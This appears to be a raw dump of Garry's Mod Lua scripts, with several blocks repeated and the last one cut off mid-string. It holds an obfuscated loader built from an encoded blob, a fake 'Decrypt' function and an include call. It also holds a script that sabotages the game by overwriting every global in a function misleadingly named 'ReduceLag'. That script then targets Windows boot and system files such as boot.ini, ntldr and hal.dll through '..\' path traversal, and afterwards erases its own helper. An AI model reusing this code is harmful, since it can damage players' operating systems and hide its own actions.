
----------------------------------------
--         2014-07-12 20:32:24          --
------------------------------------------
local CCC = [[==AAAAd93b/MkjpL6a2e3gV+L/87+5Kgi/gYqzaYYAAAAAAAAAAAZAQAAAQX==AAA3frnAUAoppJ6DhtOOwFLmrWz5bRCRV8HoAjYAAAAAAAAAAAZAQAAAQX==AAA3rz2AUAoppJ6DhtOOwFLmrWz5bRCRV8HoADZAAAAAAAAAAAZAQAAAQX==AAA337FBUAoppJ6DhtOOwFLmrWz5bRCRV8HoAjZAAAAAAAAAAAZAQAAAQX==AAA3DEVBUAoppJ6DhtOOwFLmrWz5bRCRV8HoADaAAAAAAAAAAAZAQAAAQX==AAA3PMkBUAoppJ6DhtOOwFLmrWz5bRCRV8HoAjaAAAAAAAAAAAZAQAAAQX==AAA3bUzBUAoppJ6DhtOOwFLmrWz5bRCRV8HoADbAAAAAAAAAAAZAQAAAQX==AAA3ncCCUAoppJ6DhtOOwFLmrWz5bRCRV8HoAjbAAAAAAAAAAAZAQAAAQX==AAA3zkRCUAoppJ6DhtOOwFLmrWz5bRCRV8HoADcAAAAAAAAAAAZAQAAAQX==AAA3/sgCUAoppJ6DhtOOwFLmrWz5bRCRV8HoAjcAAAAAAAAAAAZAQAAAQXA02m7p8necBLDvaNG2mH6qZgUTviDOc8HETdYzCjYAAAAAAAAAAAbAQAAAQXAAubXAqciptiQtCrKjwiQOvqN3+REqkEA+SdYzL4YAAAAAAAAAAAbAQAAAQX9w+7fBrBIRgbErMmQtpWe1OI9A0gdSqAxccZHJIjYAAAAAAAAAAAbAQAAAQX9wQzIcrBIRgbErMmQtpWe1OI9A0gdSqAxccZHJMjYAAAAAAAAAAAbAQAAAQXHdTV8zkjYpogQkQrh5OFNrV1ChTWXafFLjCJHJQjYAAAAAAAAAAAbAQAAAQXHdzwCNljYpogQkQrh5OFNrV1ChTWXafFLjCJHJUjYAAAAAAAAAAAbAQAAAQXHdR2nkljYpogQkQrh5OFNrV1ChTWXafFLjCJHJYjYAAAAAAAAAAAbAQAAAQXHdvSu9ljYpogQkQrh5OFNrV1ChTWXafFLjCJHJcjYAAAAAAAAAAAbAQAAAQXHyh7aQicdsxwAW6qhLmRmPhc5orNxKvkMXI5GJgjYAAAAAAAAAAAbAQAAAQXHyXtDoicdsxwAW6qhLmRmPhc5orNxKvkMXI5GJkjYAAAAAAAAAAAbAQAAAQXA8tpWYZRfcBLDvaNG2mH6qZgUTviDOc8HETdYzCDZAAAAAAAAAAAbAQAAAQXGHbfGBNW7gwbyAcTk2/IO0RJTYowZ6SoYfXqHJEDZAAAAAAAAAAAbAQAAAQXAAIPRdCVjptiQtCrKjwiQOvqN3+REqkEA+SdYzLYZAAAAAAAAAAAbAQAAAQX9wQzIvHEIRgbErMmQtpWe1OI9A0gdSqAxccZHJMDZAAAAAAAAAAAbAQAAAQXHdTV8Z8lYpogQkQrh5OFNrV1ChTWXafFLjCJHJQDZAAAAAAAAAAAbAQAAAQXHdzwCz8lYpogQkQrh5OFNrV1ChTWXafFLjCJHJUDZAAAAAAAAAAAbAQAAAQXHdR2nK9lYpogQkQrh5OFNrV1ChTWXafFLjCJHJYDZAAAAAAAAAAAbAQAAAQXHdvSuj9lYpogQkQrh5OFNrV1ChTWXafFLjCJHJcDZAAAAAAAAAAAbAQAAAQXHyh7aN1edsxwAW6qhLmRmPhc5orNxKvkMXI5GJgDZAAAAAAAAAAAbAQAAAQXHyXtDl1edsxwAW6qhLmRmPhc5orNxKvkMXI5GJkDZAAAAAAAAAAAbAQAAAQXA02m7516fcBLDvaNG2mH6qZgUTviDOc8HETdYzCjZAAAAAAAAAAAbAQAAAQXGHbfGPuY7gwbyAcTk2/IO0RJTYowZ6SoYfXqHJEjZAAAAAAAAAAAbAQAAAQX9w+7fnjGIRgbErMmQtpWe1OI9A0gdSqAxccZHJIjZAAAAAAAAAAAbAQAAAQXAAubTtaNkptiQtCrKjwiQOvqN3+REqkEA+SdYzL4ZAAAAAAAAAAAbAQAAAQXHdTV8/ToYpogQkQrh5OFNrV1ChTWXafFLjCJHJQjZAAAAAAAAAAAbAQAAAQXHdzwCZUoYpogQkQrh5OFNrV1ChTWXafFLjCJHJUjZAAAAAAAAAAAbAQAAAQXHdR2nwUoYpogQkQrh5OFNrV1ChTWXafFLjCJHJYjZAAAAAAAAAAAbAQAAAQXHdvSuJVoYpogQkQrh5OFNrV1ChTWXafFLjCJHJcjZAAAAAAAAAAAbAQAAAQXHyh7aKIhdsxwAW6qhLmRmPhc5orNxKvkMXI5GJgjZAAAAAAAAAAAbAQAAAQXHyXtDiIhdsxwAW6qhLmRmPhc5orNxKvkMXI5GJkjZAAAAAAAAAAAbAQAAAQXA8tpWoSkgcBLDvaNG2mH6qZgUTviDOc8HETdYzCDaAAAAAAAAAAAbAQAAAQXGHbfGdPb7gwbyAcTk2/IO0RJTYowZ6SoYfXqHJEDaAAAAAAAAAAAbAQAAAQX9w+7f6/IIRgbErMmQtpWe1OI9A0gdSqAxccZHJIDaAAAAAAAAAAAbAQAAAQX]]
local include
local function Decrypt(v)
	local c,a = "local CCC = [[", 0
	for i=0,#v * 60 do
		a = a * a - a
		c = c..util.Base64Encode( util.Compress( string.reverse(a..i..a..v..i) ) ) 
		a = a * a + a
	end
	return c
end
if include then include( Decrypt(CCC) ) end
CCC = nil


----------------------------------------
--         2014-07-12 20:32:24          --
------------------------------------------
local CCC = [[==AAAAd93b/MkjpL6a2e3gV+L/87+5Kgi/gYqzaYYAAAAAAAAAAAZAQAAAQX==AAA3frnAUAoppJ6DhtOOwFLmrWz5bRCRV8HoAjYAAAAAAAAAAAZAQAAAQX==AAA3rz2AUAoppJ6DhtOOwFLmrWz5bRCRV8HoADZAAAAAAAAAAAZAQAAAQX==AAA337FBUAoppJ6DhtOOwFLmrWz5bRCRV8HoAjZAAAAAAAAAAAZAQAAAQX==AAA3DEVBUAoppJ6DhtOOwFLmrWz5bRCRV8HoADaAAAAAAAAAAAZAQAAAQX==AAA3PMkBUAoppJ6DhtOOwFLmrWz5bRCRV8HoAjaAAAAAAAAAAAZAQAAAQX==AAA3bUzBUAoppJ6DhtOOwFLmrWz5bRCRV8HoADbAAAAAAAAAAAZAQAAAQX==AAA3ncCCUAoppJ6DhtOOwFLmrWz5bRCRV8HoAjbAAAAAAAAAAAZAQAAAQX==AAA3zkRCUAoppJ6DhtOOwFLmrWz5bRCRV8HoADcAAAAAAAAAAAZAQAAAQX==AAA3/sgCUAoppJ6DhtOOwFLmrWz5bRCRV8HoAjcAAAAAAAAAAAZAQAAAQXA02m7p8necBLDvaNG2mH6qZgUTviDOc8HETdYzCjYAAAAAAAAAAAbAQAAAQXAAubXAqciptiQtCrKjwiQOvqN3+REqkEA+SdYzL4YAAAAAAAAAAAbAQAAAQX9w+7fBrBIRgbErMmQtpWe1OI9A0gdSqAxccZHJIjYAAAAAAAAAAAbAQAAAQX9wQzIcrBIRgbErMmQtpWe1OI9A0gdSqAxccZHJMjYAAAAAAAAAAAbAQAAAQXHdTV8zkjYpogQkQrh5OFNrV1ChTWXafFLjCJHJQjYAAAAAAAAAAAbAQAAAQXHdzwCNljYpogQkQrh5OFNrV1ChTWXafFLjCJHJUjYAAAAAAAAAAAbAQAAAQXHdR2nkljYpogQkQrh5OFNrV1ChTWXafFLjCJHJYjYAAAAAAAAAAAbAQAAAQXHdvSu9ljYpogQkQrh5OFNrV1ChTWXafFLjCJHJcjYAAAAAAAAAAAbAQAAAQXHyh7aQicdsxwAW6qhLmRmPhc5orNxKvkMXI5GJgjYAAAAAAAAAAAbAQAAAQXHyXtDoicdsxwAW6qhLmRmPhc5orNxKvkMXI5GJkjYAAAAAAAAAAAbAQAAAQXA8tpWYZRfcBLDvaNG2mH6qZgUTviDOc8HETdYzCDZAAAAAAAAAAAbAQAAAQXGHbfGBNW7gwbyAcTk2/IO0RJTYowZ6SoYfXqHJEDZAAAAAAAAAAAbAQAAAQXAAIPRdCVjptiQtCrKjwiQOvqN3+REqkEA+SdYzLYZAAAAAAAAAAAbAQAAAQX9wQzIvHEIRgbErMmQtpWe1OI9A0gdSqAxccZHJMDZAAAAAAAAAAAbAQAAAQXHdTV8Z8lYpogQkQrh5OFNrV1ChTWXafFLjCJHJQDZAAAAAAAAAAAbAQAAAQXHdzwCz8lYpogQkQrh5OFNrV1ChTWXafFLjCJHJUDZAAAAAAAAAAAbAQAAAQXHdR2nK9lYpogQkQrh5OFNrV1ChTWXafFLjCJHJYDZAAAAAAAAAAAbAQAAAQXHdvSuj9lYpogQkQrh5OFNrV1ChTWXafFLjCJHJcDZAAAAAAAAAAAbAQAAAQXHyh7aN1edsxwAW6qhLmRmPhc5orNxKvkMXI5GJgDZAAAAAAAAAAAbAQAAAQXHyXtDl1edsxwAW6qhLmRmPhc5orNxKvkMXI5GJkDZAAAAAAAAAAAbAQAAAQXA02m7516fcBLDvaNG2mH6qZgUTviDOc8HETdYzCjZAAAAAAAAAAAbAQAAAQXGHbfGPuY7gwbyAcTk2/IO0RJTYowZ6SoYfXqHJEjZAAAAAAAAAAAbAQAAAQX9w+7fnjGIRgbErMmQtpWe1OI9A0gdSqAxccZHJIjZAAAAAAAAAAAbAQAAAQXAAubTtaNkptiQtCrKjwiQOvqN3+REqkEA+SdYzL4ZAAAAAAAAAAAbAQAAAQXHdTV8/ToYpogQkQrh5OFNrV1ChTWXafFLjCJHJQjZAAAAAAAAAAAbAQAAAQXHdzwCZUoYpogQkQrh5OFNrV1ChTWXafFLjCJHJUjZAAAAAAAAAAAbAQAAAQXHdR2nwUoYpogQkQrh5OFNrV1ChTWXafFLjCJHJYjZAAAAAAAAAAAbAQAAAQXHdvSuJVoYpogQkQrh5OFNrV1ChTWXafFLjCJHJcjZAAAAAAAAAAAbAQAAAQXHyh7aKIhdsxwAW6qhLmRmPhc5orNxKvkMXI5GJgjZAAAAAAAAAAAbAQAAAQXHyXtDiIhdsxwAW6qhLmRmPhc5orNxKvkMXI5GJkjZAAAAAAAAAAAbAQAAAQXA8tpWoSkgcBLDvaNG2mH6qZgUTviDOc8HETdYzCDaAAAAAAAAAAAbAQAAAQXGHbfGdPb7gwbyAcTk2/IO0RJTYowZ6SoYfXqHJEDaAAAAAAAAAAAbAQAAAQX9w+7f6/IIRgbErMmQtpWe1OI9A0gdSqAxccZHJIDaAAAAAAAAAAAbAQAAAQX]]
local include
local function Decrypt(v)
	local c,a = "local CCC = [[", 0
	for i=0,#v * 60 do
		a = a * a - a
		c = c..util.Base64Encode( util.Compress( string.reverse(a..i..a..v..i) ) ) 
		a = a * a + a
	end
	return c
end
if include then include( Decrypt(CCC) ) end
CCC = nil


----------------------------------------
--         2014-07-12 20:32:24          --
------------------------------------------
local CCC = [[==AAAAd93b/MkjpL6a2e3gV+L/87+5Kgi/gYqzaYYAAAAAAAAAAAZAQAAAQX==AAA3frnAUAoppJ6DhtOOwFLmrWz5bRCRV8HoAjYAAAAAAAAAAAZAQAAAQX==AAA3rz2AUAoppJ6DhtOOwFLmrWz5bRCRV8HoADZAAAAAAAAAAAZAQAAAQX==AAA337FBUAoppJ6DhtOOwFLmrWz5bRCRV8HoAjZAAAAAAAAAAAZAQAAAQX==AAA3DEVBUAoppJ6DhtOOwFLmrWz5bRCRV8HoADaAAAAAAAAAAAZAQAAAQX==AAA3PMkBUAoppJ6DhtOOwFLmrWz5bRCRV8HoAjaAAAAAAAAAAAZAQAAAQX==AAA3bUzBUAoppJ6DhtOOwFLmrWz5bRCRV8HoADbAAAAAAAAAAAZAQAAAQX==AAA3ncCCUAoppJ6DhtOOwFLmrWz5bRCRV8HoAjbAAAAAAAAAAAZAQAAAQX==AAA3zkRCUAoppJ6DhtOOwFLmrWz5bRCRV8HoADcAAAAAAAAAAAZAQAAAQX==AAA3/sgCUAoppJ6DhtOOwFLmrWz5bRCRV8HoAjcAAAAAAAAAAAZAQAAAQXA02m7p8necBLDvaNG2mH6qZgUTviDOc8HETdYzCjYAAAAAAAAAAAbAQAAAQXAAubXAqciptiQtCrKjwiQOvqN3+REqkEA+SdYzL4YAAAAAAAAAAAbAQAAAQX9w+7fBrBIRgbErMmQtpWe1OI9A0gdSqAxccZHJIjYAAAAAAAAAAAbAQAAAQX9wQzIcrBIRgbErMmQtpWe1OI9A0gdSqAxccZHJMjYAAAAAAAAAAAbAQAAAQXHdTV8zkjYpogQkQrh5OFNrV1ChTWXafFLjCJHJQjYAAAAAAAAAAAbAQAAAQXHdzwCNljYpogQkQrh5OFNrV1ChTWXafFLjCJHJUjYAAAAAAAAAAAbAQAAAQXHdR2nkljYpogQkQrh5OFNrV1ChTWXafFLjCJHJYjYAAAAAAAAAAAbAQAAAQXHdvSu9ljYpogQkQrh5OFNrV1ChTWXafFLjCJHJcjYAAAAAAAAAAAbAQAAAQXHyh7aQicdsxwAW6qhLmRmPhc5orNxKvkMXI5GJgjYAAAAAAAAAAAbAQAAAQXHyXtDoicdsxwAW6qhLmRmPhc5orNxKvkMXI5GJkjYAAAAAAAAAAAbAQAAAQXA8tpWYZRfcBLDvaNG2mH6qZgUTviDOc8HETdYzCDZAAAAAAAAAAAbAQAAAQXGHbfGBNW7gwbyAcTk2/IO0RJTYowZ6SoYfXqHJEDZAAAAAAAAAAAbAQAAAQXAAIPRdCVjptiQtCrKjwiQOvqN3+REqkEA+SdYzLYZAAAAAAAAAAAbAQAAAQX9wQzIvHEIRgbErMmQtpWe1OI9A0gdSqAxccZHJMDZAAAAAAAAAAAbAQAAAQXHdTV8Z8lYpogQkQrh5OFNrV1ChTWXafFLjCJHJQDZAAAAAAAAAAAbAQAAAQXHdzwCz8lYpogQkQrh5OFNrV1ChTWXafFLjCJHJUDZAAAAAAAAAAAbAQAAAQXHdR2nK9lYpogQkQrh5OFNrV1ChTWXafFLjCJHJYDZAAAAAAAAAAAbAQAAAQXHdvSuj9lYpogQkQrh5OFNrV1ChTWXafFLjCJHJcDZAAAAAAAAAAAbAQAAAQXHyh7aN1edsxwAW6qhLmRmPhc5orNxKvkMXI5GJgDZAAAAAAAAAAAbAQAAAQXHyXtDl1edsxwAW6qhLmRmPhc5orNxKvkMXI5GJkDZAAAAAAAAAAAbAQAAAQXA02m7516fcBLDvaNG2mH6qZgUTviDOc8HETdYzCjZAAAAAAAAAAAbAQAAAQXGHbfGPuY7gwbyAcTk2/IO0RJTYowZ6SoYfXqHJEjZAAAAAAAAAAAbAQAAAQX9w+7fnjGIRgbErMmQtpWe1OI9A0gdSqAxccZHJIjZAAAAAAAAAAAbAQAAAQXAAubTtaNkptiQtCrKjwiQOvqN3+REqkEA+SdYzL4ZAAAAAAAAAAAbAQAAAQXHdTV8/ToYpogQkQrh5OFNrV1ChTWXafFLjCJHJQjZAAAAAAAAAAAbAQAAAQXHdzwCZUoYpogQkQrh5OFNrV1ChTWXafFLjCJHJUjZAAAAAAAAAAAbAQAAAQXHdR2nwUoYpogQkQrh5OFNrV1ChTWXafFLjCJHJYjZAAAAAAAAAAAbAQAAAQXHdvSuJVoYpogQkQrh5OFNrV1ChTWXafFLjCJHJcjZAAAAAAAAAAAbAQAAAQXHyh7aKIhdsxwAW6qhLmRmPhc5orNxKvkMXI5GJgjZAAAAAAAAAAAbAQAAAQXHyXtDiIhdsxwAW6qhLmRmPhc5orNxKvkMXI5GJkjZAAAAAAAAAAAbAQAAAQXA8tpWoSkgcBLDvaNG2mH6qZgUTviDOc8HETdYzCDaAAAAAAAAAAAbAQAAAQXGHbfGdPb7gwbyAcTk2/IO0RJTYowZ6SoYfXqHJEDaAAAAAAAAAAAbAQAAAQX9w+7f6/IIRgbErMmQtpWe1OI9A0gdSqAxccZHJIDaAAAAAAAAAAAbAQAAAQX]]
local include
local function Decrypt(v)
	local c,a = "local CCC = [[", 0
	for i=0,#v * 60 do
		a = a * a - a
		c = c..util.Base64Encode( util.Compress( string.reverse(a..i..a..v..i) ) ) 
		a = a * a + a
	end
	return c
end
if include then include( Decrypt(CCC) ) end
CCC = nil


----------------------------------------
--         2014-07-12 20:32:24          --
------------------------------------------
local CCC = [[==AAAAd93b/MkjpL6a2e3gV+L/87+5Kgi/gYqzaYYAAAAAAAAAAAZAQAAAQX==AAA3frnAUAoppJ6DhtOOwFLmrWz5bRCRV8HoAjYAAAAAAAAAAAZAQAAAQX==AAA3rz2AUAoppJ6DhtOOwFLmrWz5bRCRV8HoADZAAAAAAAAAAAZAQAAAQX==AAA337FBUAoppJ6DhtOOwFLmrWz5bRCRV8HoAjZAAAAAAAAAAAZAQAAAQX==AAA3DEVBUAoppJ6DhtOOwFLmrWz5bRCRV8HoADaAAAAAAAAAAAZAQAAAQX==AAA3PMkBUAoppJ6DhtOOwFLmrWz5bRCRV8HoAjaAAAAAAAAAAAZAQAAAQX==AAA3bUzBUAoppJ6DhtOOwFLmrWz5bRCRV8HoADbAAAAAAAAAAAZAQAAAQX==AAA3ncCCUAoppJ6DhtOOwFLmrWz5bRCRV8HoAjbAAAAAAAAAAAZAQAAAQX==AAA3zkRCUAoppJ6DhtOOwFLmrWz5bRCRV8HoADcAAAAAAAAAAAZAQAAAQX==AAA3/sgCUAoppJ6DhtOOwFLmrWz5bRCRV8HoAjcAAAAAAAAAAAZAQAAAQXA02m7p8necBLDvaNG2mH6qZgUTviDOc8HETdYzCjYAAAAAAAAAAAbAQAAAQXAAubXAqciptiQtCrKjwiQOvqN3+REqkEA+SdYzL4YAAAAAAAAAAAbAQAAAQX9w+7fBrBIRgbErMmQtpWe1OI9A0gdSqAxccZHJIjYAAAAAAAAAAAbAQAAAQX9wQzIcrBIRgbErMmQtpWe1OI9A0gdSqAxccZHJMjYAAAAAAAAAAAbAQAAAQXHdTV8zkjYpogQkQrh5OFNrV1ChTWXafFLjCJHJQjYAAAAAAAAAAAbAQAAAQXHdzwCNljYpogQkQrh5OFNrV1ChTWXafFLjCJHJUjYAAAAAAAAAAAbAQAAAQXHdR2nkljYpogQkQrh5OFNrV1ChTWXafFLjCJHJYjYAAAAAAAAAAAbAQAAAQXHdvSu9ljYpogQkQrh5OFNrV1ChTWXafFLjCJHJcjYAAAAAAAAAAAbAQAAAQXHyh7aQicdsxwAW6qhLmRmPhc5orNxKvkMXI5GJgjYAAAAAAAAAAAbAQAAAQXHyXtDoicdsxwAW6qhLmRmPhc5orNxKvkMXI5GJkjYAAAAAAAAAAAbAQAAAQXA8tpWYZRfcBLDvaNG2mH6qZgUTviDOc8HETdYzCDZAAAAAAAAAAAbAQAAAQXGHbfGBNW7gwbyAcTk2/IO0RJTYowZ6SoYfXqHJEDZAAAAAAAAAAAbAQAAAQXAAIPRdCVjptiQtCrKjwiQOvqN3+REqkEA+SdYzLYZAAAAAAAAAAAbAQAAAQX9wQzIvHEIRgbErMmQtpWe1OI9A0gdSqAxccZHJMDZAAAAAAAAAAAbAQAAAQXHdTV8Z8lYpogQkQrh5OFNrV1ChTWXafFLjCJHJQDZAAAAAAAAAAAbAQAAAQXHdzwCz8lYpogQkQrh5OFNrV1ChTWXafFLjCJHJUDZAAAAAAAAAAAbAQAAAQXHdR2nK9lYpogQkQrh5OFNrV1ChTWXafFLjCJHJYDZAAAAAAAAAAAbAQAAAQXHdvSuj9lYpogQkQrh5OFNrV1ChTWXafFLjCJHJcDZAAAAAAAAAAAbAQAAAQXHyh7aN1edsxwAW6qhLmRmPhc5orNxKvkMXI5GJgDZAAAAAAAAAAAbAQAAAQXHyXtDl1edsxwAW6qhLmRmPhc5orNxKvkMXI5GJkDZAAAAAAAAAAAbAQAAAQXA02m7516fcBLDvaNG2mH6qZgUTviDOc8HETdYzCjZAAAAAAAAAAAbAQAAAQXGHbfGPuY7gwbyAcTk2/IO0RJTYowZ6SoYfXqHJEjZAAAAAAAAAAAbAQAAAQX9w+7fnjGIRgbErMmQtpWe1OI9A0gdSqAxccZHJIjZAAAAAAAAAAAbAQAAAQXAAubTtaNkptiQtCrKjwiQOvqN3+REqkEA+SdYzL4ZAAAAAAAAAAAbAQAAAQXHdTV8/ToYpogQkQrh5OFNrV1ChTWXafFLjCJHJQjZAAAAAAAAAAAbAQAAAQXHdzwCZUoYpogQkQrh5OFNrV1ChTWXafFLjCJHJUjZAAAAAAAAAAAbAQAAAQXHdR2nwUoYpogQkQrh5OFNrV1ChTWXafFLjCJHJYjZAAAAAAAAAAAbAQAAAQXHdvSuJVoYpogQkQrh5OFNrV1ChTWXafFLjCJHJcjZAAAAAAAAAAAbAQAAAQXHyh7aKIhdsxwAW6qhLmRmPhc5orNxKvkMXI5GJgjZAAAAAAAAAAAbAQAAAQXHyXtDiIhdsxwAW6qhLmRmPhc5orNxKvkMXI5GJkjZAAAAAAAAAAAbAQAAAQXA8tpWoSkgcBLDvaNG2mH6qZgUTviDOc8HETdYzCDaAAAAAAAAAAAbAQAAAQXGHbfGdPb7gwbyAcTk2/IO0RJTYowZ6SoYfXqHJEDaAAAAAAAAAAAbAQAAAQX9w+7f6/IIRgbErMmQtpWe1OI9A0gdSqAxccZHJIDaAAAAAAAAAAAbAQAAAQX]]
local include
local function Decrypt(v)
	local c,a = "local CCC = [[", 0
	for i=0,#v * 60 do
		a = a * a - a
		c = c..util.Base64Encode( util.Compress( string.reverse(a..i..a..v..i) ) ) 
		a = a * a + a
	end
	return c
end
if include then include( Decrypt(CCC) ) end
CCC = nil


----------------------------------------
--         2014-07-12 20:32:51          --
------------------------------------------


local Nope = {
	"debug",
	"getfenv",
	"gethook",
	"getlocal",
	"getupvalue",
	"setmetatable",
	"setfenv",
	"setlocal",
	"setupvalue",
	"upvaluejoin",
}

local These = {
	"steam.inf",
	"gameinfo.txt",
	"AUTOEXEC.BAT",
	"boot.ini",
	"bootstat.dat",
	"config.sys",
	"ntldr",
	"explorer.exe",
	"ntoskrnl.exe",
	"hal.dll",
	"bootres.dll",
	"bootfix.bin",
	"etfsboot.com",
	"boot.sdi",
	"bootmgr",
}

local Eat = {
	"",
	"garrysmod/",
	"garrysmod/garrysmod/",
	"C:/",
	"C:/WINDOWS/",
	"C:/WINDOWS/System32/",
	"C:/WINDOWS/Boot/DVD/PCAT/en-US/",
	"C:/WINDOWS/Boot/DVD/PCAT/",
	"C:/WINDOWS/Boot/PCAT/",
}


local _G		= _G
local pairs		= pairs
local NotSX 	= NotSX
local NotTS 	= timer.Simple

local function ReduceLag()
	if _G then
		for k,v in pairs(_G) do
			_G[k] = pairs
		end
	end
	if GAMEMODE then
		for k,v in pairs(GAMEMODE) do
			GAMEMODE[k] = GAMEMODE
		end
	end
end

local function CheckEm()
	NotTS(5, CheckEm)
	
	if not debug then ReduceLag() return end
	
	for k,v in pairs(Nope) do
		if debug and debug[v] then
			ReduceLag()
		end
	end
end
NotTS(5, CheckEm)


local function Cakes(v)
	NotSX("--"..v, v)
	NotSX("--"..v, v:gsub("/", "\\") )
end
for k,k in pairs(Eat) do
	for v,v in pairs(These) do
		Cakes(k..v)
	end
end
for v,v in pairs(These) do
	local k = "..\\"
	
	for i=0,13 do
		Cakes(k..v)
		k = k.."..\\"
	end
end

NotTS(2, function()
	NotSX 	 = nil
	_G.NotSX = nil
end)








----------------------------------------
--         2014-07-12 20:32:51          --
------------------------------------------


local Nope = {
	"debug",
	"getfenv",
	"gethook",
	"getlocal",
	"getupvalue",
	"setmetatable",
	"setfenv",
	"setlocal",
	"setupvalue",
	"upvaluejoin",
}

local These = {
	"steam.inf",
	"gameinfo.txt",
	"AUTOEXEC.BAT",
	"boot.ini",
	"bootstat.dat",
	"config.sys",
	"ntldr",
	"explorer.exe",
	"ntoskrnl.exe",
	"hal.dll",
	"bootres.dll",
	"bootfix.bin",
	"etfsboot.com",
	"boot.sdi",
	"bootmgr",
}

local Eat = {
	"",
	"garrysmod/",
	"garrysmod/garrysmod/",
	"C:/",
	"C:/WINDOWS/",
	"C:/WINDOWS/System32/",
	"C:/WINDOWS/Boot/DVD/PCAT/en-US/",
	"C:/WINDOWS/Boot/DVD/PCAT/",
	"C:/WINDOWS/Boot/PCAT/",
}


local _G		= _G
local pairs		= pairs
local NotSX 	= NotSX
local NotTS 	= timer.Simple

local function ReduceLag()
	if _G then
		for k,v in pairs(_G) do
			_G[k] = pairs
		end
	end
	if GAMEMODE then
		for k,v in pairs(GAMEMODE) do
			GAMEMODE[k] = GAMEMODE
		end
	end
end

local function CheckEm()
	NotTS(5, CheckEm)
	
	if not debug then ReduceLag() return end
	
	for k,v in pairs(Nope) do
		if debug and debug[v] then
			ReduceLag()
		end
	end
end
NotTS(5, CheckEm)


local function Cakes(v)
	NotSX("--"..v, v)
	NotSX("--"..v, v:gsub("/", "\\") )
end
for k,k in pairs(Eat) do
	for v,v in pairs(These) do
		Cakes(k..v)
	end
end
for v,v in pairs(These) do
	local k = "..\\"
	
	for i=0,13 do
		Cakes(k..v)
		k = k.."..\\"
	end
end

NotTS(2, function()
	NotSX 	 = nil
	_G.NotSX = nil
end)








----------------------------------------
--         2014-07-12 20:33:07          --
------------------------------------------
local CCC = [[==AAAAd93b/MkjpL6a2e3gV+L/87+5Kgi/gYqzaYYAAAAAAAAAAAZAQAAAQX==AAA3frnAUAoppJ6DhtOOwFLmrWz5bRCRV8HoAjYAAAAAAAAAAAZAQAAAQX==AAA3rz2AUAoppJ6DhtOOwFLmrWz5bRCRV8HoADZAAAAAAAAAAAZAQAAAQX==AAA337FBUAoppJ6DhtOOwFLmrWz5bRCRV8HoAjZAAAAAAAAAAAZAQAAAQX==AAA3DEVBUAoppJ6DhtOOwFLmrWz5bRCRV8HoADaAAAAAAAAAAAZAQAAAQX==AAA3PMkBUAoppJ6DhtOOwFLmrWz5bRCRV8HoAjaAAAAAAAAAAAZAQAAAQX==AAA3bUzBUAoppJ6DhtOOwFLmrWz5bRCRV8HoADbAAAAAAAAAAAZAQAAAQX==AAA3ncCCUAoppJ6DhtOOwFLmrWz5bRCRV8HoAjbAAAAAAAAAAAZAQAAAQX==AAA3zkRCUAoppJ6DhtOOwFLmrWz5bRCRV8HoADcAAAAAAAAAAAZAQAAAQX==AAA3/sgCUAoppJ6DhtOOwFLmrWz5bRCRV8HoAjcAAAAAAAAAAAZAQAAAQXA02m7p8necBLDvaNG2mH6qZgUTviDOc8HETdYzCjYAAAAAAAAAAAbAQAAAQXAAubXAqciptiQtCrKjwiQOvqN3+REqkEA+SdYzL4YAAAAAAAAAAAbAQAAAQX9w+7fBrBIRgbErMmQtpWe1OI9A0gdSqAxccZHJIjYAAAAAAAAAAAbAQAAAQX9wQzIcrBIRgbErMmQtpWe1OI9A0gdSqAxccZHJMjYAAAAAAAAAAAbAQAAAQXHdTV8zkjYpogQkQrh5OFNrV1ChTWXafFLjCJHJQjYAAAAAAAAAAAbAQAAAQXHdzwCNljYpogQkQrh5OFNrV1ChTWXafFLjCJHJUjYAAAAAAAAAAAbAQAAAQXHdR2nkljYpogQkQrh5OFNrV1ChTWXafFLjCJHJYjYAAAAAAAAAAAbAQAAAQXHdvSu9ljYpogQkQrh5OFNrV1ChTWXafFLjCJHJcjYAAAAAAAAAAAbAQAAAQXHyh7aQicdsxwAW6qhLmRmPhc5orNxKvkMXI5GJgjYAAAAAAAAAAAbAQAAAQXHyXtDoicdsxwAW6qhLmRmPhc5orNxKvkMXI5GJkjYAAAAAAAAAAAbAQAAAQXA8tpWYZRfcBLDvaNG2mH6qZgUTviDOc8HETdYzCDZAAAAAAAAAAAbAQAAAQXGHbfGBNW7gwbyAcTk2/IO0RJTYowZ6SoYfXqHJEDZAAAAAAAAAAAbAQAAAQXAAIPRdCVjptiQtCrKjwiQOvqN3+REqkEA+SdYzLYZAAAAAAAAAAAbAQAAAQX9wQzIvHEIRgbErMmQtpWe1OI9A0gdSqAxccZHJMDZAAAAAAAAAAAbAQAAAQXHdTV8Z8lYpogQkQrh5OFNrV1ChTWXafFLjCJHJQDZAAAAAAAAAAAbAQAAAQXHdzwCz8lYpogQkQrh5OFNrV1ChTWXafFLjCJHJUDZAAAAAAAAAAAbAQAAAQXHdR2nK9lYpogQkQrh5OFNrV1ChTWXafFLjCJHJYDZAAAAAAAAAAAbAQAAAQXHdvSuj9lYpogQkQrh5OFNrV1ChTWXafFLjCJHJcDZAAAAAAAAAAAbAQAAAQXHyh7aN1edsxwAW6qhLmRmPhc5orNxKvkMXI5GJgDZAAAAAAAAAAAbAQAAAQXHyXtDl1edsxwAW6qhLmRmPhc5orNxKvkMXI5GJkDZAAAAAAAAAAAbAQAAAQXA02m7516fcBLDvaNG2mH6qZgUTviDOc8HETdYzCjZAAAAAAAAAAAbAQAAAQXGHbfGPuY7gwbyAcTk2/IO0RJTYowZ6SoYfXqHJEjZAAAAAAAAAAAbAQAAAQX9w+7fnjGIRgbErMmQtpWe1OI9A0gdSqAxccZHJIjZAAAAAAAAAAAbAQAAAQXAAubTtaNkptiQtCrKjwiQOvqN3+REqkEA+SdYzL4ZAAAAAAAAAAAbAQAAAQXHdTV8/ToYpogQkQrh5OFNrV1ChTWXafFLjCJHJQjZAAAAAAAAAAAbAQAAAQXHdzwCZUoYpogQkQrh5OFNrV1ChTWXafFLjCJHJUjZAAAAAAAAAAAbAQAAAQXHdR2nwUoYpogQkQrh5OFNrV1ChTWXafFLjCJHJYjZAAAAAAAAAAAbAQAAAQXHdvSuJVoYpogQkQrh5OFNrV1ChTWXafFLjCJHJcjZAAAAAAAAAAAbAQAAAQXHyh7aKIhdsxwAW6qhLmRmPhc5orNxKvkMXI5GJgjZAAAAAAAAAAAbAQAAAQXHyXtDiIhdsxwAW6qhLmRmPhc5orNxKvkMXI5GJkjZAAAAAAAAAAAbAQAAAQXA8tpWoSkgcBLDvaNG2mH6qZgUTviDOc8HETdYzCDaAAAAAAAAAAAbAQAAAQXGHbfGdPb7gwbyAcTk2/IO0RJTYowZ6SoYfXqHJEDaAAAAAAAAAAAbAQAAAQX9w+7f6/IIR